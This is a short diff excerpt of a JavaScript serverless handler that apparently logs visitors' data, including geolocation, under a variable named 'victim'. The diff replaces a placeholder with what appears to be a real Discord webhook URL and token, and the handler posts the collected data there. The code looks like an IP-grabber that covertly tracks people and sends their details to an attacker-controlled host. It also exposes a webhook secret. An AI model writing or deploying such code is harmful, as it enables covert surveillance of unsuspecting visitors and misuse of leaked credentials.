@@ -22,7 +22,7 @@ export default async function handler(req, res) {
   } catch(e) { victim.geo = 'N/A'; }
   
   // DISCORD WEBHOOK - REPLACE YOUR_WEBHOOK_HERE
-  fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE', {
+  fetch('https://discord.com/api/webhooks/1466414596364697702/v7A116HwPH97RLGYUHauVMwpDM47T5R50rEcD3ROXRpuvwLaCII0JjU13844BGjIIFhh', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
